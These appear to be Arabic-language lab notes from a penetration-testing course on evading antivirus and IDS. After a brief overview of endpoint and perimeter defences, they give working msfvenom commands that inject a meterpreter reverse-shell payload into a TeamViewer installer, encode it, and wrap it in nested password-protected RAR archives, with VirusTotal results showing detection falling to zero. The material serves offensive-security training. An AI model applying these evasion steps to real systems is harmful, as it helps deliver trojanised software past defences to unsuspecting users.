- عشان نattack الtarget لازم نفهم هو ازاي بيdefend
-Endpoint protection
-Perimeter protection

---
#### Endpoint Protection
- الEndpoint protection ده بيكون localized device او خدمه غرضها الوحيد انها تprotect single host علي الNetwork ممكن يكون الhost ده personal computer او corporate workstation
- الEnpoint protection عادة بتكون برامج AV Protection و Antimalware Protection
---
#### Perimeter Protection
- الperimeter protection عادة بيكون بشكل physical او virtualized علي الnetwork وده بيكون اول خط دفاع للشبكه
- الشبكة بتنقسم لـ 3 مستويات من الثقة والأمان:

-**المنطقة الخارجية (Outside Zone):** ده الإنترنت، وده مكان "معدوم الثقة" لأن أي حد في العالم موجود فيه.
    
-**المنطقة الداخلية (Inside Network):** دي شبكة الشركة الموثوقة اللي فيها بيانات الموظفين والملفات السرية، ودي ليها أعلى مستوى أمان.
    
-**المنطقة منزوعة السلاح (DMZ):** دي "المنطقة الوسطى" اللي شرحناها، وهنا النص بيوصفها بدقة:  
    - أمانها **أقل** من الشبكة الداخلية (عشان الناس تقدر توصل للسيرفرات اللي فيها).
    - لكن الثقة فيها **أعلى** من الإنترنت (لأننا عارفين السيرفرات دي وبنديرها).

----
## Security Policies
- الsecurity policy حاجه كده زي قايمة ممنوعات ومسموحات Allow & Deny بتحدد بقي مين يدخل ومين يخرج وايه الملفات المسموح فتحها 

| **الطريقة**                    | **الشرح بالبلدي**                                                                                                                                                          |
| ------------------------------ | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Signature-based**            | **البصمة:** زي "الفيش والتشبيه". الجهاز عنده داتا بيز بكل أشكال الهجمات المعروفة، لو شاف كود شبه اللي عنده بنسبة 100% بيضرب إنذار.                                         |
| **Heuristic / Statistical**    | **السلوك:** بيراقب "الطبيعي" بتاع الشبكة. لو الموظف "أحمد" متعود يرفع 10 ميجا كل يوم، وفجأة لقيناه بيرفع 50 جيجا، السياسة هنا بتعتبر ده شذوذ (Anomaly) وتوقف العملية.      |
| **Stateful Protocol Analysis** | **تحليل البروتوكول:** الجهاز بيبقى عارف أصول "الكلام" (البروتوكولات). لو لقى حد بيبعت بيانات HTTP بشكل غريب مش ماشي مع القواعد القياسية، بيعرف إن فيه تلاعب.               |
| **SOC-based**                  | **العنصر البشري:** فريق من المحللين (SOC Analysts) قاعدين قدام شاشات 24 ساعة، بيراقبوا كل اللي فات ده، وهما اللي بيقرروا هل ده هجوم حقيقي ولا إنذار كاذب (False Positive). |

---
## Evasion Techniques
- معظم الAVs دلوقتي شغالين signature-based Detection عشان هما بيكتشفو الmalicious code
- اول ما تحمل ملف علي الجهاز الAV بيعمله scan ويقارن كود الملف باللي عنده فالdb لو لقي في تطابق بينهم يمسح الملف
- المشكله ان الdevs بتوع الAVs بيتابعو الmetasploit أول بأول واي payload جديد بينزل بياخدو بصمته ويضيوفها عندهم فالDB طب ايه الحل؟
**الحل الأول: Network Encryption**
- عشان تهرب من الIDS/IPS لازم تشفر حركتك جوا الشبكه عن طريقMSF6 AES Encryption
**الحل الثاني: الهروب من الDNS Exfiltratiob**
- لو الشبكه قافله كل حاجه وليها Strict Rules الهكرز بيستخدمة حيلة صايعه زي اللي حصلت في اختراق Equifax وهي إنهم بيستغلو بورت الDNS ويبدأو يسحبو البيانات جوه طلبات الDNS عشان محدش يحس بيهم
**الحل الثالث: Backdoored Executable**
- الـ**Executable Templates:** بدل ما تبعت ملف `evil.exe` شكله مشبوه، الـ `msfvenom` بيسمح لك تستخدم "قالب" لبرنامج حقيقي (زي برنامج WinRAR أو لعبة أو Installer).
- **الفكرة:** إنت بتحقن (Inject) الـ Shellcode بتاعك جوه كود البرنامج الأصلي السليم.
- **النتيجة:** الأنتي فيروس لما يجي يفحص، هيشوف برنامج سليم ومعروف، والـ Shellcode بتاعك "مستخبي" في وسط آلاف السطور من الكود الحقيقي. ده بيقلل نسبة الكشف جداً
- 
```shell-session
0xTroj6n@htb[/htb]$ msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -x ~/Downloads/TeamViewer_Setup.exe -e x86/shikata_ga_nai -a x86 --platform windows -o ~/Desktop/TeamViewer_Setup.exe -i 5

Attempting to read payload from STDIN...
Found 1 compatible encoders
Attempting to encode payload with 5 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 27 (iteration=0)
x86/shikata_ga_nai succeeded with size 54 (iteration=1)
x86/shikata_ga_nai succeeded with size 81 (iteration=2)
x86/shikata_ga_nai succeeded with size 108 (iteration=3)
x86/shikata_ga_nai succeeded with size 135 (iteration=4)
x86/shikata_ga_nai chosen with final size 135
Payload size: 135 bytes
Saved as: /home/user/Desktop/TeamViewer_Setup.exe
```
- الفلاج اللي هو `k-` بيخلي الpayload يشتغل والبرنامج المحقون فيه الكود برضو يشتغل يعني بالفعل ده برنامج team viewer بس محقون فيه payload من غير الk- البرنامج مش هيشتغل اه الشيل هيشتغل بس سهل يتكشف
---
## Archives
- في تكنيك من اقدم وابسط الحيل اللي بيستخدمها الهاكرز عشان يهربو من الAV وهي (Password-Protected Archives)
- مش فاهم؟ بص ياسيدي برامج الAV بتفحص محتوي الملف عشان تقارنه بالsignature اللي عندها ف احنا هنا هنحط الملف كا zip او rar ونحط عليه كلمة سر بحيث الملفات اللي جواه بتبقي متشفره ميعرفش الAV يفتحها
- بس طبعا الAV مش غبي هيروح باعت تنبيه للadmin ان في ملف مضغوط مش عارف افتحه يروح sys admin فاتحه يدويا او يمسحه
#### Generating Payload

```shell-session
0xTroj6n@htb[/htb]$ msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -e x86/shikata_ga_nai -a x86 --platform windows -o ~/test.js -i 5

Attempting to read payload from STDIN...
Found 1 compatible encoders
Attempting to encode payload with 5 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 27 (iteration=0)
x86/shikata_ga_nai succeeded with size 54 (iteration=1)
x86/shikata_ga_nai succeeded with size 81 (iteration=2)
x86/shikata_ga_nai succeeded with size 108 (iteration=3)
x86/shikata_ga_nai succeeded with size 135 (iteration=4)
x86/shikata_ga_nai chosen with final size 135
Payload size: 135 bytes
Saved as: /home/user/test.js
```

```shell-session
0xTroj6n@htb[/htb]$ cat test.js

�+n"����t$�G4ɱ1zz��j�V6����ic��o�Bs>��Z*�����9vt��%��1�
<...SNIP...>
�Qa*���޴��RW�%Š.\�=;.l�T���XF���T��
```

#### VirusTotal

```shell-session
0xTroj6n@htb[/htb]$ msf-virustotal -k <API key> -f test.js 

[*] WARNING: When you upload or otherwise submit content, you give VirusTotal
[*] (and those we work with) a worldwide, royalty free, irrevocable and transferable
[*] licence to use, edit, host, store, reproduce, modify, create derivative works,
[*] communicate, publish, publicly perform, publicly display and distribute such
[*] content. To read the complete Terms of Service for VirusTotal, please go to the
[*] following link:
[*] https://www.virustotal.com/en/about/terms-of-service/
[*] 
[*] If you prefer your own API key, you may obtain one at VirusTotal.

[*] Enter 'Y' to acknowledge: Y


[*] Using API key: <API key>
[*] Please wait while I upload test.js...
[*] VirusTotal: Scan request successfully queued, come back later for the report
[*] Sample MD5 hash    : 35e7687f0793dc3e048d557feeaf615a
[*] Sample SHA1 hash   : f2f1c4051d8e71df0741b40e4d91622c4fd27309
[*] Sample SHA256 hash : 08799c1b83de42ed43d86247ebb21cca95b100f6a45644e99b339422b7b44105
[*] Analysis link: https://www.virustotal.com/gui/file/<SNIP>/detection/f-<SNIP>-1652167047
[*] Requesting the report...
[*] Received code 0. Waiting for another 60 seconds...
[*] Analysis Report: test.js (11 / 59): <...SNIP...>
====================================================================================================

 Antivirus             Detected  Version               Result                             Update
 ---------             --------  -------               ------                             ------
 ALYac                 true      1.1.3.1               Exploit.Metacoder.Shikata.Gen      20220510
 AVG                   true      21.1.5827.0           Win32:ShikataGaNai-A [Trj]         20220510
 Acronis               false     1.2.0.108                                                20220426
 Ad-Aware              true      3.0.21.193            Exploit.Metacoder.Shikata.Gen      20220510
 AhnLab-V3             false     3.21.3.10230                                             20220510
 Antiy-AVL             false     3.0                                                      20220510
 Arcabit               false     1.0.0.889                                                20220510
 Avast                 true      21.1.5827.0           Win32:ShikataGaNai-A [Trj]         20220510
 Avira                 false     8.3.3.14                                                 20220510
 Baidu                 false     1.0.0.2                                                  20190318
 BitDefender           true      7.2                   Exploit.Metacoder.Shikata.Gen      20220510
 BitDefenderTheta      false     7.2.37796.0                                              20220428
 Bkav                  false     1.3.0.9899                                               20220509
 CAT-QuickHeal         false     14.00                                                    20220510
 CMC                   false     2.10.2019.1                                              20211026
 ClamAV                true      0.105.0.0             Win.Trojan.MSShellcode-6360729-0   20220509
 Comodo                false     34607                                                    20220510
 Cynet                 false     4.0.0.27                                                 20220510
 Cyren                 false     6.5.1.2                                                  20220510
 DrWeb                 false     7.0.56.4040                                              20220510
 ESET-NOD32            false     25243                                                    20220510
 Emsisoft              true      2021.5.0.7597         Exploit.Metacoder.Shikata.Gen (B)  20220510
 F-Secure              false     18.10.978.51                                             20220510
 FireEye               true      35.24.1.0             Exploit.Metacoder.Shikata.Gen      20220510
 Fortinet              false     6.2.142.0                                                20220510
 GData                 true      A:25.33002B:27.27300  Exploit.Metacoder.Shikata.Gen      20220510
 Gridinsoft            false     1.0.77.174                                               20220510
 Ikarus                false     6.0.24.0                                                 20220509
 Jiangmin              false     16.0.100                                                 20220509
 K7AntiVirus           false     12.12.42275                                              20220510
 K7GW                  false     12.12.42275                                              20220510
 Kaspersky             false     21.0.1.45                                                20220510
 Kingsoft              false     2017.9.26.565                                            20220510
 Lionic                false     7.5                                                      20220510
 MAX                   true      2019.9.16.1           malware (ai score=89)              20220510
 Malwarebytes          false     4.2.2.27                                                 20220510
 MaxSecure             false     1.0.0.1                                                  20220510
 McAfee                false     6.0.6.653                                                20220510
 McAfee-GW-Edition     false     v2019.1.2+3728                                           20220510
 MicroWorld-eScan      true      14.0.409.0            Exploit.Metacoder.Shikata.Gen      20220510
 Microsoft             false     1.1.19200.5                                              20220510
 NANO-Antivirus        false     1.0.146.25588                                            20220510
 Panda                 false     4.6.4.2                                                  20220509
 Rising                false     25.0.0.27                                                20220510
 SUPERAntiSpyware      false     5.6.0.1032                                               20220507
 Sangfor               false     2.14.0.0                                                 20220507
 Sophos                false     1.4.1.0                                                  20220510
 Symantec              false     1.17.0.0                                                 20220510
 TACHYON               false     2022-05-10.02                                            20220510
 Tencent               false     1.0.0.1                                                  20220510
 TrendMicro            false     11.0.0.1006                                              20220510
 TrendMicro-HouseCall  false     10.0.0.1040                                              20220510
 VBA32                 false     5.0.0                                                    20220506
 ViRobot               false     2014.3.20.0                                              20220510
 VirIT                 false     9.5.191                                                  20220509
 Yandex                false     5.5.2.24                                                 20220428
 Zillya                false     2.0.0.4627                                               20220509
 ZoneAlarm             false     1.0                                                      20220510
 Zoner                 false     2.2.2.0     
```
#### Archiving the Payload

```shell-session
0xTroj6n@htb[/htb]$ wget https://www.rarlab.com/rar/rarlinux-x64-612.tar.gz
0xTroj6n@htb[/htb]$ tar -xzvf rarlinux-x64-612.tar.gz && cd rar
0xTroj6n@htb[/htb]$ rar a ~/test.rar -p ~/test.js

Enter password (will not be echoed): ******
Reenter password: ******

RAR 5.50   Copyright (c) 1993-2017 Alexander Roshal   11 Aug 2017
Trial version             Type 'rar -?' for help
Evaluation copy. Please register.

Creating archive test.rar
Adding    test.js                                                     OK 
Done
```

```shell-session
0xTroj6n@htb[/htb]$ ls

test.js   test.rar
```
#### Removing the .RAR Extension

```shell-session
0xTroj6n@htb[/htb]$ mv test.rar test
0xTroj6n@htb[/htb]$ ls

test   test.js
```

#### Archiving the Payload Again

```shell-session
0xTroj6n@htb[/htb]$ rar a test2.rar -p test

Enter password (will not be echoed): ******
Reenter password: ******

RAR 5.50   Copyright (c) 1993-2017 Alexander Roshal   11 Aug 2017
Trial version             Type 'rar -?' for help
Evaluation copy. Please register.

Creating archive test2.rar
Adding    test                                                        OK 
Done
```

#### Removing the .RAR Extension

```shell-session
0xTroj6n@htb[/htb]$ mv test2.rar test2
0xTroj6n@htb[/htb]$ ls

test   test2   test.js
```
#### VirusTotal

```shell-session
0xTroj6n@htb[/htb]$ msf-virustotal -k <API key> -f test2

[*] Using API key: <API key>
[*] Please wait while I upload test2...
[*] VirusTotal: Scan request successfully queued, come back later for the report
[*] Sample MD5 hash    : 2f25eeeea28f737917e59177be61be6d
[*] Sample SHA1 hash   : c31d7f02cfadd87c430c2eadf77f287db4701429
[*] Sample SHA256 hash : 76ec64197aa2ac203a5faa303db94f530802462e37b6e1128377315a93d1c2ad
[*] Analysis link: https://www.virustotal.com/gui/file/<SNIP>/detection/f-<SNIP>-1652167804
[*] Requesting the report...
[*] Received code 0. Waiting for another 60 seconds...
[*] Received code -2. Waiting for another 60 seconds...
[*] Received code -2. Waiting for another 60 seconds...
[*] Received code -2. Waiting for another 60 seconds...
[*] Received code -2. Waiting for another 60 seconds...
[*] Received code -2. Waiting for another 60 seconds...
[*] Analysis Report: test2 (0 / 49): 76ec64197aa2ac203a5faa303db94f530802462e37b6e1128377315a93d1c2ad
=================================================================================================

 Antivirus             Detected  Version         Result  Update
 ---------             --------  -------         ------  ------
 ALYac                 false     1.1.3.1                 20220510
 Acronis               false     1.2.0.108               20220426
 Ad-Aware              false     3.0.21.193              20220510
 AhnLab-V3             false     3.21.3.10230            20220510
 Antiy-AVL             false     3.0                     20220510
 Arcabit               false     1.0.0.889               20220510
 Avira                 false     8.3.3.14                20220510
 BitDefender           false     7.2                     20220510
 BitDefenderTheta      false     7.2.37796.0             20220428
 Bkav                  false     1.3.0.9899              20220509
 CAT-QuickHeal         false     14.00                   20220510
 CMC                   false     2.10.2019.1             20211026
 ClamAV                false     0.105.0.0               20220509
 Comodo                false     34606                   20220509
 Cynet                 false     4.0.0.27                20220510
 Cyren                 false     6.5.1.2                 20220510
 DrWeb                 false     7.0.56.4040             20220510
 ESET-NOD32            false     25243                   20220510
 Emsisoft              false     2021.5.0.7597           20220510
 F-Secure              false     18.10.978.51            20220510
 FireEye               false     35.24.1.0               20220510
 Fortinet              false     6.2.142.0               20220510
 Gridinsoft            false     1.0.77.174              20220510
 Jiangmin              false     16.0.100                20220509
 K7AntiVirus           false     12.12.42275             20220510
 K7GW                  false     12.12.42275             20220510
 Kingsoft              false     2017.9.26.565           20220510
 Lionic                false     7.5                     20220510
 MAX                   false     2019.9.16.1             20220510
 Malwarebytes          false     4.2.2.27                20220510
 MaxSecure             false     1.0.0.1                 20220510
 McAfee-GW-Edition     false     v2019.1.2+3728          20220510
 MicroWorld-eScan      false     14.0.409.0              20220510
 NANO-Antivirus        false     1.0.146.25588           20220510
 Panda                 false     4.6.4.2                 20220509
 Rising                false     25.0.0.27               20220510
 SUPERAntiSpyware      false     5.6.0.1032              20220507
 Sangfor               false     2.14.0.0                20220507
 Symantec              false     1.17.0.0                20220510
 TACHYON               false     2022-05-10.02           20220510
 Tencent               false     1.0.0.1                 20220510
 TrendMicro-HouseCall  false     10.0.0.1040             20220510
 VBA32                 false     5.0.0                   20220506
 ViRobot               false     2014.3.20.0             20220510
 VirIT                 false     9.5.191                 20220509
 Yandex                false     5.5.2.24                20220428
 Zillya                false     2.0.0.4627              20220509
 ZoneAlarm             false     1.0                     20220510
 Zoner                 false     2.2.2.0                 20220509
```
---
## Packers
- الPacker هيا أداة بتعمل ضغط وتشفير للملف التنفيذي .exe كله
- فكرته انه بياخد الpayload بتاعك ويضغطه ويحط معاه كود صغير اسمه Decompression Stub بيبقى عبارة عن ملف واحد بس. لما الضحية يدوس عليه، الـ Stub ده بيشتغل الأول في الرامات (Memory)، ويفك ضغط الـ Payload الحقيقي ويشغله "في صمت" من غير ما الملف الأصلي يتغير على الهارد
**أشهر الPackers**
- الـ**UPX:** أشهر وأقدم واحد، استخدامه سهل جداً ومفتوح المصدر.
- الـ**Themida / Enigma:** دول "الوحوش" في المجال ده، بيستخدموا تقنيات معقدة جداً بتخلي حتى مهندسين الـ Reverse Engineering يتعبوا عشان يفهموا الكود بيعمل إي
---
